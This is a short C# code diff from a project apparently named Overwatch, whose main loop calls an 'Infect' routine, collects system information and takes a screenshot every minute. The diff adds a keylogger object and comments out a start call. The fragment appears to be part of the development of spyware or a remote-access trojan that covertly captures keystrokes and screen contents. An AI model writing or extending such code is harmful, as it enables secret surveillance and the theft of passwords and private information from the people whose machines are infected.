@@ -14,10 +14,11 @@ namespace Overwatch
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
                 info.Overview();
+                cKeylogger k = new cKeylogger();
                 while (true)
                 {
                     info.ScreenShoot();
-                    info.Start();
+                    //info.Start();
                     System.Threading.Thread.Sleep(60000);
                 }
 
